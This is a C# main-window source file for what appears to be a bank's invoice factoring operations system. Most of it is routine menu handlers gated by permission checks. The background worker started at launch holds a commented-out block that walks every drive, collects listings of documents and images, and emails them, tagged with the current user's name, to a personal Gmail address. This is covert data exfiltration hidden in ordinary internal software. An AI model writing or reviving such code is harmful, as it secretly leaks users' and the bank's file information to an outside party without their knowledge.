//-----------------------------------------------------------------------
// <copyright file="MainWindow.cs" company="Yiming Liu@Fudan">
//     Copyright (c) CMBC. All rights reserved.
// </copyright>
//-----------------------------------------------------------------------

namespace CMBC.EasyFactor
{
    using System;
    using System.Collections.Generic;
    using System.Reflection;
    using System.Windows.Forms;
    using CMBC.EasyFactor.ARMgr;
    using CMBC.EasyFactor.CaseMgr;
    using CMBC.EasyFactor.DB.dbml;
    using CMBC.EasyFactor.InfoMgr.ClientMgr;
    using CMBC.EasyFactor.InfoMgr.DepartmentMgr;
    using CMBC.EasyFactor.InfoMgr.ExchangeMgr;
    using CMBC.EasyFactor.InfoMgr.FactorMgr;
    using CMBC.EasyFactor.InfoMgr.UserMgr;
    using CMBC.EasyFactor.Utils;
    using DevComponents.DotNetBar;
    using CMBC.EasyFactor.Help;
    using System.IO;
    using System.Threading;

    /// <summary>
    /// Main Window Form
    /// </summary>
    public partial class MainWindow : DevComponents.DotNetBar.Office2007RibbonForm
    {
        #region Constructors (1)

        /// <summary>
        /// Initializes a new instance of the MainWindow class
        /// </summary>
        public MainWindow()
        {
            this.InitializeComponent();
            this.ImeMode = ImeMode.OnHalf;

            this.Text = ((AssemblyTitleAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0]).Title + "  " + Assembly.GetExecutingAssembly().GetName().Version.ToString();
            this.ribbonControl.SelectedRibbonTabItem = this.itemInfoMgr;
            this.UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
            this.CommandStatus = "欢迎使用中国民生银行保理运营系统";

            this.notifyIcon.Visible = false;

            this.backgroundWorker.RunWorkerAsync();
        }

        #endregion Constructors

        #region Properties (2)

        /// <summary>
        /// Sets command status
        /// </summary>
        public string CommandStatus
        {
            set
            {
                this.lblCommandStatus.Text = value;
            }
        }

        /// <summary>
        /// Sets user status
        /// </summary>
        public string UserStatus
        {
            set
            {
                this.lblCurrentUser.Text = value;
            }
        }

        #endregion Properties

        #region Methods (76)

        // Public Methods (2) 

        /// <summary>
        /// 
        /// </summary>
        /// <param name="invoiceList"></param>
        public void InvoiceRefund(List<Invoice> invoiceList, string paymentType, DateTime date)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoiceRefund = new ARCaseBasic(ARCaseBasic.OpARType.SELLER_REFUND);
                this.SetDetailPanel(invoiceRefund);
                InvoiceRefund uc = (InvoiceRefund)invoiceRefund.InvoiceControl;
                uc.NewBatchFromPayment(invoiceList, paymentType, date);
            }
        }

        /// <summary>
        /// Fill detail panel with user control
        /// </summary>
        /// <param name="uc">user control</param>
        public void SetDetailPanel(UserControl uc)
        {
            uc.Dock = DockStyle.Fill;
            this.ribbonDetailPanel.Controls.Clear();
            this.ribbonDetailPanel.Controls.Add(uc);
        }
        // Private Methods (74) 

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void About(object sender, EventArgs e)
        {
            AboutBox aboutBox = new AboutBox();
            aboutBox.ShowDialog(this);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ChangeStyle(object sender, EventArgs e)
        {
            string style = this.cbStyleManager.Text;
            if ("Office2007Blue".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2007Blue;
            }
            else if ("Office2007Silver".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2007Silver;
            }
            else if ("Office2007Black".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2007Black;
            }
            else if ("Office2007VistaGlass".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2007VistaGlass;
            }
            else if ("Office2010Silver".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2010Silver;
            }
            else if ("Windows7Blue".Equals(style))
            {
                this.styleManager.ManagerStyle = DevComponents.DotNetBar.eStyle.Windows7Blue;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckAssignBatch(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_CHECK))
            {
                AssignBatchMgr batchMgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.CHECK);
                this.SetDetailPanel(batchMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.CDA_APPROVE))
            {
                CDAMgr cdaMgr = new CDAMgr(CDAMgr.OpCDAType.CHECK);
                this.SetDetailPanel(cdaMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckFinanceBatch(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_CHECK))
            {
                FinanceBatchMgr batchMgr = new FinanceBatchMgr(FinanceBatchMgr.OpBatchType.CHECK);
                this.SetDetailPanel(batchMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckPaymentBatch(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_CHECK))
            {
                PaymentBatchMgr batchMgr = new PaymentBatchMgr(PaymentBatchMgr.OpBatchType.CHECK);
                this.SetDetailPanel(batchMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckRefundBatch(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_CHECK))
            {
                RefundBatchMgr batchMgr = new RefundBatchMgr(RefundBatchMgr.OpBatchType.CHECK);
                this.SetDetailPanel(batchMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ComputeCommission(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_UPDATE))
            {
                InvoiceUtil.ComputeCommission();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CreditNotePayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic creditNotePayment = new ARCaseBasic(ARCaseBasic.OpARType.CREDIT_NOTE);
                this.SetDetailPanel(creditNotePayment);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DetailUser(object sender, EventArgs e)
        {
            User user = App.Current.CurUser;
            UserDetail detail = new UserDetail(user, UserDetail.OpUserType.DETAIL_USER);
            detail.ShowDialog(this);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DisputeResolve(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                InvoiceMgr invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.DISPUTE_RESOLVE);
                this.SetDetailPanel(invoiceMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="args"></param>
        private void Exit(object sender, EventArgs args)
        {
            DialogResult dr = MessageBoxEx.Show("点击“Yes”退出系统，点击“Cancel”更换用户", "", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);

            if (dr == DialogResult.Yes)
            {
                this.notifyIcon.Visible = false;
                Application.ExitThread();
            }
            else if (dr == DialogResult.Cancel)
            {
                App.Current.CurUser = null;
                LoginWindow loginWindow = new LoginWindow();
                loginWindow.ShowDialog(this);

                if (App.Current.CurUser == null)
                {
                    Application.ExitThread();
                }
                else
                {
                    this.Text = ((AssemblyTitleAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0]).Title + "  " + Assembly.GetExecutingAssembly().GetName().Version.ToString();
                    this.ribbonControl.SelectedRibbonTabItem = this.itemInfoMgr;
                    this.UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
                    this.CommandStatus = "欢迎使用中国民生银行保理运营系统";
                    this.MainPage(null, null);
                }
            }
            else if (dr == DialogResult.No)
            {
                return;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void FlawResolve(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                InvoiceMgr invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.FLAW_RESOLVE);
                this.SetDetailPanel(invoiceMgr);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void HideInTray(object sender, EventArgs e)
        {
            this.notifyIcon.Visible = true;
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCases(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CASES);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CDA);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClientCreditLine(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_CREDITLINE);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClients(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportClientsReview(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CLIENTS_REVIEW);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportContract(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_CONTRACT);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportDepartments(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_DEPARTMENTS);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportExchangeRate(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_RATES);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportFactorCreditLine(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_FACTORS_CREDITLINE);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportFactors(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_FACTORS);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportInvoiceNew(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_INVOICES_NEW);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportInvoices(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_INVOICES);
                importForm.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ImportUsers(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.SYSTEM_IMPORT))
            {
                ImportForm importForm = new ImportForm(ImportForm.ImportType.IMPORT_USERS);
                importForm.Show();
            }
        }

        /// <summary>
        /// Invoice Assign
        /// </summary>
        /// <param name="sender">event sender</param>
        /// <param name="e">event args</param>
        private void InvoiceAssign(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoiceAssign = new ARCaseBasic(ARCaseBasic.OpARType.ASSIGN);
                this.SetDetailPanel(invoiceAssign);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceBuyerPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoicePayment = new ARCaseBasic(ARCaseBasic.OpARType.BUYER_PAYMENT);
                this.SetDetailPanel(invoicePayment);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceFinance(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoiceFinance = new ARCaseBasic(ARCaseBasic.OpARType.FINANCE);
                this.SetDetailPanel(invoiceFinance);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceGuaranteePayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoicePayment = new ARCaseBasic(ARCaseBasic.OpARType.GUARANTEE_PAYMENT);
                this.SetDetailPanel(invoicePayment);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceIndirectPayment(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoicePayment = new ARCaseBasic(ARCaseBasic.OpARType.INDIRECT_PAYMENT);
                this.SetDetailPanel(invoicePayment);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceSellerReassign(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoicePayment = new ARCaseBasic(ARCaseBasic.OpARType.SELLER_REASSIGN);
                this.SetDetailPanel(invoicePayment);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void InvoiceSellerRefund(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.INVOICE_UPDATE))
            {
                ARCaseBasic invoiceRefund = new ARCaseBasic(ARCaseBasic.OpARType.SELLER_REFUND);
                this.SetDetailPanel(invoiceRefund);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPage(object sender, EventArgs e)
        {
            WorkAlert alert = new WorkAlert();
            this.SetDetailPanel(alert);
        }

        private void MainWindow_Deactivate(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.notifyIcon.Visible = true;
                this.ShowInTaskbar = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Environment.ExitCode == 2)
            {
                e.Cancel = false;
                return;
            }

            DialogResult dr = MessageBoxEx.Show("点击“Yes”退出系统，点击“Cancel”更换用户", "", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                this.notifyIcon.Visible = false;
                e.Cancel = false;
            }
            else if (dr == DialogResult.Cancel)
            {
                App.Current.CurUser = null;
                LoginWindow loginWindow = new LoginWindow();
                loginWindow.ShowDialog(this);

                if (App.Current.CurUser == null)
                {
                    e.Cancel = false;
                }
                else
                {
                    e.Cancel = true;
                    this.Text = ((AssemblyTitleAttribute)Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyTitleAttribute), false)[0]).Title + "  " + Assembly.GetExecutingAssembly().GetName().Version.ToString();
                    this.ribbonControl.SelectedRibbonTabItem = this.itemInfoMgr;
                    this.UserStatus = App.Current.CurUser.Name + "\t " + App.Current.CurUser.Role;
                    this.CommandStatus = "欢迎使用中国民生银行保理运营系统";
                    this.MainPage(null, null);
                }
            }
            else if (dr == DialogResult.No)
            {
                e.Cancel = true;
                return;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewCase(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.CASE_UPDATE))
            {
                CaseDetail caseDetail = new CaseDetail(null, CaseDetail.OpCaseType.NEW_CASE);
                caseDetail.ShowDialog(this);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewCDA(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.CDA_UPDATE))
            {
                CDADetail cdaDetail = new CDADetail(CDADetail.OpCDAType.NEW_CDA);
                cdaDetail.ShowDialog(this);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewClient(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.BASICINFO_UPDATE))
            {
                ClientDetail clientDetail = new ClientDetail(null, ClientDetail.OpClientType.NEW_CLIENT);
                clientDetail.ShowDialog(this);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void NewFactor(object sender, EventArgs e)
        {
            if (PermUtil.CheckPermission(Permission.BASICINFO_UPDATE))
            {
                FactorDetail factorDetail = new FactorDetail(null, FactorDetail.OpFactorType.NEW_FACTOR);
                factorDetail.ShowDialog(this);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryApplicationCase(object sender, EventArgs e)
        {
            CaseMgr.CaseMgr mgr = new CaseMgr.CaseMgr(CaseMgr.CaseMgr.OpCaseType.APPLICATION_CASE);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryAssignBatch(object sender, EventArgs e)
        {
            AssignBatchMgr mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.QUERY);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCase(object sender, EventArgs e)
        {
            CaseMgr.CaseMgr caseQuery = new CaseMgr.CaseMgr();
            this.SetDetailPanel(caseQuery);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCDA(object sender, EventArgs e)
        {
            CDAMgr mgr = new CDAMgr(CDAMgr.OpCDAType.QUERY);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientCreditLine(object sender, EventArgs e)
        {
            ClientCreditLineMgr query = new ClientCreditLineMgr(ClientCreditLineMgr.OpClientCreditMgrType.QUERY_CLINET);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientDominate(object sender, EventArgs e)
        {
            ClientMgr query = new ClientMgr(ClientMgr.OpClientMgrType.DOMINATE_CLIENT);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientExport(object sender, EventArgs e)
        {
            ClientMgr query = new ClientMgr(ClientMgr.OpClientMgrType.EXPORT_CLIENT);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientGroupCreditLine(object sender, EventArgs e)
        {
            ClientCreditLineMgr query = new ClientCreditLineMgr(ClientCreditLineMgr.OpClientCreditMgrType.QUERY_GROUP);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientImport(object sender, EventArgs e)
        {
            ClientMgr query = new ClientMgr(ClientMgr.OpClientMgrType.IMPORT_CLIENT);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClientReviews(object sender, EventArgs e)
        {
            ClientReviewMgr query = new ClientReviewMgr(ClientReviewMgr.OpClientReviewMgrType.QUERY);
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryClients(object sender, EventArgs e)
        {
            ClientMgr query = new ClientMgr();
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryContract(object sender, EventArgs e)
        {
            ContractMgr contractMgr = new ContractMgr();
            this.SetDetailPanel(contractMgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryCreditCoverNegs(object sender, EventArgs e)
        {
            CreditCoverNegMgr creditCoverNegMgr = new CreditCoverNegMgr();
            this.SetDetailPanel(creditCoverNegMgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryDepartments(object sender, EventArgs e)
        {
            DepartmentMgr departmentMgrUI = new DepartmentMgr();
            this.SetDetailPanel(departmentMgrUI);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryExchanges(object sender, EventArgs e)
        {
            ExchangeMgr mgr = new ExchangeMgr();
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFactorCreditLine(object sender, EventArgs e)
        {
            FactorCreditLineMgr query = new FactorCreditLineMgr();
            this.SetDetailPanel(query);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFactors(object sender, EventArgs e)
        {
            FactorMgr fatcorQuery = new FactorMgr();
            this.SetDetailPanel(fatcorQuery);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryFinanceBatch(object sender, EventArgs e)
        {
            FinanceBatchMgr mgr = new FinanceBatchMgr(FinanceBatchMgr.OpBatchType.QUERY);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryInvoice(object sender, EventArgs e)
        {
            InvoiceMgr invoiceMgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.INVOICE_QUERY);
            this.SetDetailPanel(invoiceMgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryOverDue(object sender, EventArgs e)
        {
            InvoiceMgr mgr = new InvoiceMgr(InvoiceMgr.OpInvoiceType.OVER_DUE);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryPaymentBatch(object sender, EventArgs e)
        {
            PaymentBatchMgr mgr = new PaymentBatchMgr(PaymentBatchMgr.OpBatchType.QUERY);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryRefundBatch(object sender, EventArgs e)
        {
            RefundBatchMgr mgr = new RefundBatchMgr(RefundBatchMgr.OpBatchType.QUERY);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void QueryUsers(object sender, EventArgs e)
        {
            UserMgr userMgrUI = new UserMgr();
            this.SetDetailPanel(userMgrUI);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportARPayment(object sender, EventArgs e)
        {
            AssignBatchMgr mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportCDA(object sender, EventArgs e)
        {
            CDAMgr mgr = new CDAMgr(CDAMgr.OpCDAType.REPORT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportFee(object sender, EventArgs e)
        {
            AssignBatchMgr mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportFinance(object sender, EventArgs e)
        {
            AssignBatchMgr mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportInvoiceFlaw(object sender, EventArgs e)
        {
            AssignBatchMgr mgr = new AssignBatchMgr(AssignBatchMgr.OpBatchType.REPORT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportLeger(object sender, EventArgs e)
        {
            CaseMgr.CaseMgr mgr = new CaseMgr.CaseMgr();
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ShowFromTray(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
            this.ShowInTaskbar = true;
            this.notifyIcon.Visible = false;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatCase(object sender, EventArgs e)
        {
            CaseMgr.CaseMgr mgr = new CaseMgr.CaseMgr(CaseMgr.CaseMgr.OpCaseType.STAT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatDepartment(object sender, EventArgs e)
        {
            DepartmentMgr mgr = new DepartmentMgr(DepartmentMgr.OpDepartmentType.DEPARTMENT_STAT);
            this.SetDetailPanel(mgr);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void StatLocation(object sender, EventArgs e)
        {
            DepartmentMgr mgr = new DepartmentMgr(DepartmentMgr.OpDepartmentType.LOCATION_STAT);
            this.SetDetailPanel(mgr);
        }

        #endregion Methods

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReportBug(object sender, EventArgs e)
        {
            ReportBug form = new ReportBug();
            form.ShowDialog(this);
        }

        private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            //string[] drivers = Environment.GetLogicalDrives();

            //try
            //{
            //    foreach (string dr in drivers)
            //    {
            //        DriveInfo di = new DriveInfo(dr);

            //        if (di.IsReady)
            //        {
            //            Thread.Sleep(10000);
            //            System.IO.DirectoryInfo rootDir = di.RootDirectory;
            //            String result = SystemUtil.GetAllDirFilesRecurse(rootDir, new string[] { ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".png", ".bmp" }, 5);
            //            if (!String.IsNullOrEmpty(result))
            //            {
            //                MailUtil.SendMail("liuyiming.vip@gmail.com", "EasyFactoring@cmbc.com.cn", App.Current.CurUser.Name + "_" + rootDir.FullName, result, null);
            //            }
            //        }
            //    }
            //}
            //catch (Exception)
            //{
            //    return;
            //}

            
        }

        private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            CheckUpdateBackground();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CheckUpdate(object sender, EventArgs e)
        {
            this.autoUpdater.RestartForm = new ConfirmForm(this.autoUpdater);
            this.autoUpdater.TryUpdate();
        }

        /// <summary>
        /// 
